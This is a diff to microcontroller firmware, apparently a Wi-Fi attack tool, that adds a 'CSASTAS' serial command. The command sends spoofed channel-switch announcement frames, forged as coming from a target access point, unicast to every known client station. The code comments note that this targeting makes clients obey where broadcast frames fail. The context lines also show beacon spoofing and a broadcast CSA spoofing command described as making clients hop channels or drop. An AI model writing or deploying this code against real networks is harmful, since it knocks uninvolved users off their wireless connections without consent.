@@ -2025,6 +2025,42 @@ void loop() {
       for(int i=0;i<cnt;i++) tx_beacon_raw(src, TX_BCAST, ssid.c_str(), (uint8_t)ftype, chan);
       String r = "TXBEACON:" + String(ftype, HEX) + ":" + String((unsigned)cnt);
       Serial.println(r); Serial1.println(r);
+    }else if(readString.substring(0,7)=="CSASTAS"){
+      // B2b: unicast CSA to every station we know about (from the last STASCAN). That is what a
+      // real AP does and what clients actually obey - broadcast CSA action frames are widely
+      // ignored (measured: broadcast dropped some clients, Apple/ax ignored it entirely).
+      // Args: CSASTAS <bssid-12hex> <ap-chan> <new-chan> [frames]
+      int s1 = readString.indexOf(' ');
+      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
+      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
+      String hex = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
+      int apch = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1).toInt() : 6;
+      int newch = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 1;
+      uint8_t bssid[6];
+      bool ok = (hex.length() == 12);
+      for(int i = 0; ok && i < 6; i++) {
+        int hi = hexnib(hex.charAt(i * 2));
+        int lo = hexnib(hex.charAt(i * 2 + 1));
+        if(hi < 0 || lo < 0) { ok = false; break; }
+        bssid[i] = (uint8_t)((hi << 4) | lo);
+      }
+      if(!ok) {
+        Serial.println("ERROR: CSASTAS needs a 12-hex bssid"); Serial1.println("ERROR: CSASTAS needs a 12-hex bssid");
+      }else if(sta_n == 0) {
+        Serial.println("ERROR: no stations known - run STASCAN first"); Serial1.println("ERROR: no stations known - run STASCAN first");
+      }else{
+        if(apch < 1 || apch > 165) apch = 6;
+        if(newch < 1 || newch > 165) newch = 1;
+        if(apActive) destroyAP();
+        wext_set_channel(WLAN0_NAME, apch);
+        uint8_t sent = 0;
+        for(uint8_t i = 0; i < sta_n && i < STA_MAX; i++) {
+          for(int x = 0; x < 3; x++) csa_send_frame(bssid, (uint8_t)newch, 3, 1, sta_list[i].mac);
+          sent++;
+        }
+        String r = String("CSASTAS:") + String((unsigned)sent) + " ch=" + String(newch);
+        Serial.println(r); Serial1.println(r);
+      }
     }else if(readString.substring(0,3)=="CSA" && readString.charAt(3)==' '){
       // B2: CSA <bssid-12hex> <ap-chan> <new-chan> [frames]
       // Spoofs channel-switch announcements from the target AP; its clients hop channels (or drop)
